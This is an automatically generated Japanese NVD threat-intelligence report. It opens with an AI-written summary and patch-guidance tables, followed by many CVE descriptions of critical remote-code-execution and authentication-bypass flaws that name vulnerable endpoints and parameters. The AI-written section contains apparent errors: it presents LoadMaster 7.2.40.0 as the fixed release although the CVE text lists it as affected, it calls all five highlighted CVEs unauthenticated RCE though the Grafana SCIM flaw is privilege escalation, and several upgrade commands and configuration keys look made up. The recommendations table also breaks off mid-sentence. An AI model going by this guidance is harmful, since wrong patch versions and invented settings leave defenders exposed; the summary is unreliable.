# NVD 脅威インテリジェンスレポート

- **生成日時**: 2026-06-23 15:00 UTC
- **対象期間**: `2026-06-22T15:00:44.000Z` 〜 `2026-06-23T15:00:39.000Z`
- **重要CVE数**: 574 件（Critical 9.0+: 262 件 / High 7.0〜: 312 件）

---

## AI 分析サマリー

## 1. 全体サマリー  
- 2024‑2026 年に報告された CVSS 7.0 以上の CVE は、**認証不要でリモートコード実行 (RCE) が可能**なものが多数を占め、特にネットワーク機器・管理プラットフォームが標的となっています。  
- 多くは **不適切な入力検証・認可実装** に起因し、攻撃者は管理インターフェースや API を直接叩くだけで **ルート権限取得** が可能です。  
- ベンダー側のパッチ提供が遅れがちで、**旧バージョンが長期間運用されている環境**での被害拡大が懸念されます。  

---

## 2. 特に注目すべき CVE  

| CVE | 製品 / コンポーネント | 主な脆弱性種別 | 影響範囲・理由 |
|-----|----------------------|----------------|----------------|
| **CVE‑2026‑34908** | UniFi OS (Ubiquiti) | Improper Access Control → 任意のシステム変更 | ネットワーク上の任意の攻撃者が管理画面をバイパスし、設定変更・ファームウェア書き換えが可能。UniFi は企業・教育機関で広く採用されているためインパクト大。 |
| **CVE‑2026‑20079** | Cisco Secure Firewall Management Center (FMC) | Authentication Bypass + Remote Script Execution | 認証なしで Web UI に侵入し、OS の root 権限でスクリプト実行ができる。Cisco 製品は大規模ネットワークの要であり、侵害が全社的な被害に直結。 |
| **CVE‑2025‑34392** | Barracuda Service Center (RMM) | 任意ファイル書き込み・WebShell アップロード (WSDL URL 参照) | 攻撃者が制御可能な WSDL を指定でき、任意のファイルを書き込んで RCE を実行。RMM ソリューションは多数の顧客環境に常駐しているため、横展開リスクが高い。 |
| **CVE‑2025‑41115** | Grafana Enterprise / Cloud (SCIM プロビジョニング) | ID 予測可能性と権限昇格 | SCIM が有効化された環境で、ユーザー ID が推測可能となり、攻撃者が管理者権限のユーザーを作成できる。Grafana は可視化基盤として多くの組織で使用されている。 |
| **CVE‑2025‑41243** | Spring Cloud Gateway (WebFlux) | 環境プロパティ改ざんによる RCE | Spring Cloud Gateway の WebFlux 実装で、外部から環境変数を上書きでき、任意コード実行が可能。Spring 系マイクロサービスは多数のクラウドアプリで採用されている。 |

> **注**：上記は CVSS が 10.0（最高）であり、かつ **広範囲に展開されている製品**、**認証不要でリモートコード実行が可能**という点で特に危険度が高いと判断しました。

---

## 3. 推奨アクション  

### 共通対策
- **緊急パッチ適用**：ベンダーが提供するセキュリティパッチを **リリース日から 48 時間以内** に適用する。  
- **ネットワーク分離**：管理インターフェース (Web UI / API) への外部からの直接アクセスを防ぐため、IP アクセスコントロールリスト (ACL) や VPN のみから接続可能にする。  
- **監査ログの有効化**：認証失敗・管理コマンド実行のログを集中管理し、SIEM でリアルタイムアラートを設定する。  
- **最小権限の原則**：不要な管理権限や SCIM 機能はデフォルトで無効化し、必要時にのみ限定的に有効化する。  

### 製品別具体的対策  

| 製品 | 推奨バージョン / パッチ | 実装手順例 |
|------|------------------------|------------|
| **UniFi OS** |  **v8.5.27 以降** (Ubiquiti 公開パッチ) | 1. `apt-get update && apt-get upgrade unifi-os`  <br>2. 管理 UI への外部 IP アクセスをファイアウォールで遮断 |
| **Cisco FMC** |  **v7.2.3‑2026‑01 以降** (Cisco Security Advisory) | 1. `software install` コマンドで最新イメージをロード <br>2. 管理インターフェースの HTTPS 設定を強化し、TLS 1.2 以上のみ許可 |
| **Barracuda Service Center** |  **RMM 2025.1.1 以降** | 1. 管理コンソール → 「アップデート」から自動更新を有効化 <br>2. WSDL URL の外部取得を禁止するファイアウォールルールを追加 |
| **Grafana Enterprise / Cloud** |  **12.2.5 以降** (SCIM 修正) | 1. `grafana-cli plugins update-all` で全プラグインを最新化 <br>2. SCIM 機能を使用しない場合は `scim.enabled = false` に設定 |
| **Spring Cloud Gateway (WebFlux)** |  **3.2.6 以降** (Spring Security 5.8.3) | 1. `pom.xml` の `spring-cloud-gateway` バージョンを更新 <br>2. `application.yml` で外部からの `spring.cloud.gateway.env.*` 変更を禁止 (`allowOverride: false`) |
| **Cisco ISE / ISE‑PIC** (CVE‑2025‑20337, 2025‑20281) |  **バージョン 3.2.1 以降** | 1. Cisco ISE のアップグレードガイドに従い、`install ise` を実行 <br>2. API エンドポイントの認証強化（OAuth2 / MFA） |
| **Wing FTP Server** (CVE‑2025‑47812) |  **7.4.4 以降** | 1. 管理画面 → 「アップデート」から最新版へ自動更新 <br>2. `\0` バイト処理をサニタイズするカスタムモジュールを導入（必要に応じて） |
| **Hikvision Integrated Security Management** (CVE‑2025‑34067) |  **v5.5.12 以降** | 1. Fastjson のバージョンを 1.2.86 以上に固定 <br>2. `/bic/ssoService/v1/applyCT` エンドポイントへの外部アクセスを IP 制限 |
| **LoadMaster (Progress) 系列** (CVE‑2024‑7591, 2024‑1212) |  **7.2.40.0 以降** (全製品共通) | 1. 管理 UI の `admin` パスワードを強固なランダム文字列に変更 <br>2. コマンドインジェクション防

---

## 🔴 Critical（CVSS 9.0+）

### CVE-2026-34908

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-284` |
| Published | 2026-05-22T00:43:49.077Z |

A malicious actor with access to the network could exploit an Improper Access Control vulnerability found in UniFi OS devices to make unauthorized changes to the system.

### CVE-2026-20079

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2026-03-04T17:17:35.838Z |

A vulnerability in the web interface of Cisco Secure Firewall Management Center (FMC) Software could allow an unauthenticated, remote attacker to bypass authentication and execute script files on an affected device to obtain root access to the underlying operating system.
 This vulnerability is due to an improper system process that is created at boot time. An attacker could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute a variety of scripts and commands that allow root access to the device.

### CVE-2025-34392

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-36` |
| Published | 2025-12-10T15:44:52.631Z |

Barracuda Service Center, as implemented in the RMM solution, in versions prior to 2025.1.1, does not verify the URL defined in an attacker-controlled WSDL that is later loaded by the application. This can lead to arbitrary file write and remote code execution via webshell upload.

### CVE-2025-41115

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2025-11-21T14:25:38.945Z |

SCIM provisioning was introduced in Grafana Enterprise and Grafana Cloud in April to improve how organizations manage users and teams in Grafana by introducing automated user lifecycle management.

In Grafana versions 12.x where SCIM provisioning is enabled and configured, a vulnerability in user identity handling allows a malicious or compromised SCIM client to provision a user with a numeric externalId, which in turn could allow to override internal user IDs and lead to impersonation or privilege escalation.

This vulnerability applies only if all of the following conditions are met:
- `enableSCIM` feature flag set to true
- `user_sync_enabled` config option in the `[auth.scim]` block set to true

### CVE-2025-41243

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-917;CWE-94` |
| Published | 2025-09-16T14:54:57.396Z |

Spring Cloud Gateway Server Webflux may be vulnerable to Spring Environment property modification.

An application should be considered vulnerable when all the following are true:

  *  The application is using Spring Cloud Gateway Server Webflux (Spring Cloud Gateway Server WebMVC is not vulnerable).
  *  Spring Boot actuator is a dependency.
  *  The Spring Cloud Gateway Server Webflux actuator web endpoint is enabled via management.endpoints.web.exposure.include=gateway.
  *  The actuator endpoints are available to attackers.
  *  The actuator endpoints are unsecured.

### CVE-2018-25115

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-27T21:24:23.427Z |

Multiple D-Link DIR-series routers, including DIR-110, DIR-412, DIR-600, DIR-610, DIR-615, DIR-645, and DIR-815 firmware version 1.03, contain a vulnerability in the service.cgi endpoint that allows remote attackers to execute arbitrary system commands without authentication. The flaw stems from improper input handling in the EVENT=CHECKFW parameter, which is passed directly to the system shell without sanitization. A crafted HTTP POST request can inject commands that are executed with root privileges, resulting in full device compromise. These router models are no longer supported at the time of assignment and affected version ranges may vary. Exploitation evidence was first observed by the Shadowserver Foundation on 2025-08-21 UTC.

### CVE-2025-20337

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-74` |
| Published | 2025-07-16T16:17:04.664Z |

A vulnerability in a specific API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated, remote attacker to execute arbitrary code on the underlying operating system as root. The attacker does not require any valid credentials to exploit this vulnerability.

This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by submitting a crafted API request. A successful exploit could allow the attacker to obtain root privileges on an affected device.

### CVE-2025-47812

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-158` |
| Published | 2025-07-10T00:00:00.000Z |

In Wing FTP Server before 7.4.4. the user and admin web interfaces mishandle '\0' bytes, ultimately allowing injection of arbitrary Lua code into user session files. This can be used to execute arbitrary system commands with the privileges of the FTP service (root or SYSTEM by default). This is thus a remote code execution vulnerability that guarantees a total server compromise. This is also exploitable via anonymous FTP accounts.

### CVE-2025-34067

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-502` |
| Published | 2025-07-02T13:44:21.664Z |

An unauthenticated remote command execution vulnerability exists in the applyCT component of the Hikvision Integrated Security Management Platform due to the use of a vulnerable version of the Fastjson library. The endpoint /bic/ssoService/v1/applyCT deserializes untrusted user input, allowing an attacker to trigger Fastjson's auto-type feature to load arbitrary Java classes. By referencing a malicious class via an LDAP URL, an attacker can achieve remote code execution on the underlying system. Exploitation evidence was observed by the Shadowserver Foundation on 2025-02-05 UTC.

### CVE-2025-20281

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-74` |
| Published | 2025-06-25T16:11:42.285Z |

A vulnerability in a specific API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated, remote attacker to execute arbitrary code on the underlying operating system as root. The attacker does not require any valid credentials to exploit this vulnerability.

This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by submitting a crafted API request. A successful exploit could allow the attacker to obtain root privileges on an affected device.

### CVE-2025-31324

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-434` |
| Published | 2025-04-24T16:50:27.706Z |

SAP NetWeaver Visual Composer Metadata Uploader is not protected with a proper authorization, allowing unauthenticated agent to upload potentially malicious executable binaries that could severely harm the host system. This could significantly affect the confidentiality, integrity, and availability of the targeted system.

### CVE-2025-32433

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2025-04-16T21:34:37.457Z |

Erlang/OTP is a set of libraries for the Erlang programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.

### CVE-2024-54085

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-290` |
| Published | 2025-03-11T14:00:58.643Z |

AMI’s SPx contains
a vulnerability in the BMC where an Attacker may bypass authentication remotely through the Redfish Host Interface. A successful exploitation
of this vulnerability may lead to a loss of confidentiality, integrity, and/or
availability.

### CVE-2025-27364

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-02-24T00:00:00.000Z |

In MITRE Caldera through 4.2.0 and 5.0.0 before 35bc06e, a Remote Code Execution (RCE) vulnerability was found in the dynamic agent (implant) compilation functionality of the server. This allows remote attackers to execute arbitrary code on the server that Caldera is running on via a crafted web request to the Caldera server API used for compiling and downloading of Caldera's Sandcat or Manx agent (implants). This web request can use the gcc -extldflags linker flag with sub-commands.

### CVE-2024-50603

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-01-08T00:00:00.000Z |

An issue was discovered in Aviatrix Controller before 7.1.4191 and 7.2.x before 7.2.4996. Due to the improper neutralization of special elements used in an OS command, an unauthenticated attacker is able to execute arbitrary code. Shell metacharacters can be sent to /v1/api in cloud_type for list_flightpath_destination_instances, or src_cloud_type for flightpath_connection_test.

### CVE-2024-51378

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2024-10-29T00:00:00.000Z |

getresetstatus in dns/views.py and ftp/views.py in CyberPanel (aka Cyber Panel) before 1c0c6cb allows remote attackers to bypass authentication and execute arbitrary commands via /dns/getresetstatus or /ftp/getresetstatus by bypassing secMiddleware (which is only for a POST request) and using shell metacharacters in the statusfile property, as exploited in the wild in October 2024 by PSAUX. Versions through 2.3.6 and (unpatched) 2.3.7 are affected.

### CVE-2024-51567

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2024-10-29T00:00:00.000Z |

upgrademysqlstatus in databases/views.py in CyberPanel (aka Cyber Panel) before 5b08cd6 allows remote attackers to bypass authentication and execute arbitrary commands via /dataBases/upgrademysqlstatus by bypassing secMiddleware (which is only for a POST request) and using shell metacharacters in the statusfile property, as exploited in the wild in October 2024 by PSAUX. Versions through 2.3.6 and (unpatched) 2.3.7 are affected.

### CVE-2024-51568

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2024-10-29T00:00:00.000Z |

CyberPanel (aka Cyber Panel) before 2.3.5 allows Command Injection via completePath in the ProcessUtilities.outputExecutioner() sink. There is /filemanager/upload (aka File Manager upload) unauthenticated remote code execution via shell metacharacters.

### CVE-2024-45519

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2024-10-02T00:00:00.000Z |

The postjournal service in Zimbra Collaboration (ZCS) before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1 sometimes allows unauthenticated users to execute commands.

### CVE-2024-45409

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-347` |
| Published | 2024-09-10T18:50:12.965Z |

The Ruby SAML library is for implementing the client side of a SAML authorization. Ruby-SAML in <= 12.2 and 1.13.0 <= 1.16.0 does not properly verify the signature of the SAML Response. An unauthenticated attacker with access to any signed saml document (by the IdP) can thus forge a SAML Response/Assertion with arbitrary contents. This would allow the attacker to log in as arbitrary user within the vulnerable system. This vulnerability is fixed in 1.17.0 and 1.12.3.

### CVE-2024-7591

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-09-05T17:16:30.342Z |

Improper Input Validation vulnerability in Progress LoadMaster allows OS Command Injection.This issue affects:

* LoadMaster: 7.2.40.0 and above

* ECS: All versions

* Multi-Tenancy: 7.1.35.4 and above

### CVE-2024-20419

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-620` |
| Published | 2024-07-17T16:27:35.418Z |

A vulnerability in the authentication system of Cisco Smart Software Manager On-Prem (SSM On-Prem) could allow an unauthenticated, remote attacker to change the password of any user, including administrative users.
 This vulnerability is due to improper implementation of the password-change process. An attacker could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow an attacker to access the web UI or API with the privileges of the compromised user.

### CVE-2024-25600

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2024-06-04T12:51:27.971Z |

Improper Control of Generation of Code ('Code Injection') vulnerability in Codeer Limited Bricks Builder allows Code Injection.This issue affects Bricks Builder: from n/a through 1.9.6.

### CVE-2024-3400

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-77;CWE-20` |
| Published | 2024-04-12T07:20:00.707Z |

A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.

Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.

### CVE-2024-2389

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-04-02T12:22:45.131Z |

In Flowmon versions prior to 11.1.14 and 12.3.5, an operating system command injection vulnerability has been identified.  An unauthenticated user can gain entry to the system via the Flowmon management interface, allowing for the execution of arbitrary system commands.



### CVE-2024-1212

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-02-21T17:39:12.599Z |

Unauthenticated remote attackers can access the system through the LoadMaster management interface, enabling arbitrary system command execution.

### CVE-2024-1709

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2024-02-21T15:36:03.960Z |

ConnectWise ScreenConnect 23.9.7 and prior are affected by an Authentication Bypass Using an Alternate Path or Channel

 vulnerability, which may allow an attacker direct access to confidential information or 

critical systems.

### CVE-2023-22527

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-01-16T05:00:00.692Z |

A template injection vulnerability on older versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance. Customers using an affected version must take immediate action.

Most recent supported versions of Confluence Data Center and Server are not affected by this vulnerability as it was ultimately mitigated during regular version updates. However, Atlassian recommends that customers take care to install the latest version to protect their instances from non-critical vulnerabilities outlined in Atlassian’s January Security Bulletin.

### CVE-2023-7028

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-640` |
| Published | 2024-01-12T13:56:41.726Z |

An issue has been discovered in GitLab CE/EE affecting all versions from 16.1 prior to 16.1.6, 16.2 prior to 16.2.9, 16.3 prior to 16.3.7, 16.4 prior to 16.4.5, 16.5 prior to 16.5.6, 16.6 prior to 16.6.4, and 16.7 prior to 16.7.2 in which user account password reset emails could be delivered to an unverified email address.

### CVE-2023-22518

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2023-10-31T14:30:00.418Z |

All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. This Improper Authorization vulnerability allows an unauthenticated attacker to reset Confluence and create a Confluence instance administrator account. Using this account, an attacker can then perform all administrative actions that are available to Confluence instance administrator leading to - but not limited to - full loss of confidentiality, integrity and availability. 

Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.

### CVE-2023-46604

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2023-10-27T14:59:31.046Z |

The Java OpenWire protocol marshaller is vulnerable to Remote Code 
Execution. This vulnerability may allow a remote attacker with network 
access to either a Java-based OpenWire broker or client to run arbitrary
 shell commands by manipulating serialized class types in the OpenWire 
protocol to cause either the client or the broker (respectively) to 
instantiate any class on the classpath.

Users are recommended to upgrade
 both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 
which fixes this issue.

### CVE-2023-20198

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-420` |
| Published | 2023-10-16T15:12:58.735Z |

Cisco is providing an update for the ongoing investigation into observed exploitation of the web UI feature in Cisco IOS XE Software. We are updating the list of fixed releases and adding the Software Checker. Our investigation has determined that the actors exploited two previously unknown issues. The attacker first exploited CVE-2023-20198 to gain initial access and issued a privilege 15 command to create a local user and password combination. This allowed the user to log in with normal user access. The attacker then exploited another component of the web UI feature, leveraging the new local user to elevate privilege to root and write the implant to the file system. Cisco has assigned CVE-2023-20273 to this issue. CVE-2023-20198 has been assigned a CVSS Score of 10.0. CVE-2023-20273 has been assigned a CVSS Score of 7.2. Both of these CVEs are being tracked by CSCwh87343.

### CVE-2023-22515

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2023-10-04T14:00:00.820Z |

Atlassian has been made aware of an issue reported by a handful of customers where external attackers may have exploited a previously unknown vulnerability in publicly accessible Confluence Data Center and Server instances to create unauthorized Confluence administrator accounts and access Confluence instances. 

Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.

### CVE-2023-40044

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2023-09-27T14:48:08.190Z |

In WS_FTP Server versions prior to 8.7.4 and 8.8.2, a pre-authenticated attacker could leverage a .NET deserialization vulnerability in the Ad Hoc Transfer module to execute remote commands on the underlying WS_FTP Server operating system.

### CVE-2023-41892

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-94` |
| Published | 2023-09-13T19:45:25.736Z |

Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

### CVE-2023-35082

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2023-08-15T15:11:56.545Z |

An authentication bypass vulnerability in Ivanti EPMM 11.10 and older, allows unauthorized users to access restricted functionality or resources of the application without proper authentication. This vulnerability is unique to CVE-2023-35078 announced earlier.

### CVE-2023-35078

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2023-07-25T06:08:38.441Z |

An authentication bypass vulnerability in Ivanti EPMM allows unauthorized users to access restricted functionality or resources of the application without proper authentication.

### CVE-2021-41277

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-200` |
| Published | 2021-11-17T20:05:11.000Z |

Metabase is an open source data analytics platform. In affected versions a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded. This issue is fixed in a new maintenance release (0.40.5 and 1.40.5), and any subsequent release after that. If you’re unable to upgrade immediately, you can mitigate this by including rules in your reverse proxy or load balancer or WAF to provide a validation filter before the application.

### CVE-2021-38454

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-284` |
| Published | 2021-10-12T13:37:54.121Z |

A path traversal vulnerability in the Moxa MXview Network Management software Versions 3.x to 3.2.2 may allow an attacker to create or overwrite critical files used to execute code, such as programs or libraries.

### CVE-2020-6287

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2020-07-14T12:30:14.000Z |

SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.

### CVE-2019-12643

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2019-08-28T18:40:12.837Z |

A vulnerability in the Cisco REST API virtual service container for Cisco IOS XE Software could allow an unauthenticated, remote attacker to bypass authentication on the managed Cisco IOS XE device. The vulnerability is due to an improper check performed by the area of code that manages the REST API authentication service. An attacker could exploit this vulnerability by submitting malicious HTTP requests to the targeted device. A successful exploit could allow the attacker to obtain the token-id of an authenticated user. This token-id could be used to bypass authentication and execute privileged actions through the interface of the REST API virtual service container on the affected Cisco IOS XE device. The REST API interface is not enabled by default and must be installed and activated separately on IOS XE devices. See the Details section for more information.

### CVE-2018-19276

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.0/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2019-03-17T21:30:20.000Z |

OpenMRS before 2.24.0 is affected by an Insecure Object Deserialization vulnerability that allows an unauthenticated user to execute arbitrary commands on the targeted system via crafted XML data in a request body.

### CVE-2025-20333

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-120` |
| Published | 2025-09-25T16:12:14.308Z |

A vulnerability in the VPN web server of Cisco Secure Firewall Adaptive Security Appliance (ASA) Software and Cisco Secure Firewall Threat Defense (FTD) Software could allow an authenticated, remote attacker to execute arbitrary code on an affected device.
 This vulnerability is due to improper validation of user-supplied input in HTTP(S) requests. An attacker with valid VPN user credentials could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute arbitrary code as root, possibly resulting in the complete compromise of the affected device.

### CVE-2025-49113

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2025-06-02T00:00:00.000Z |

Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization.

### CVE-2025-2945

| 項目 | 値 |
|------|-----|
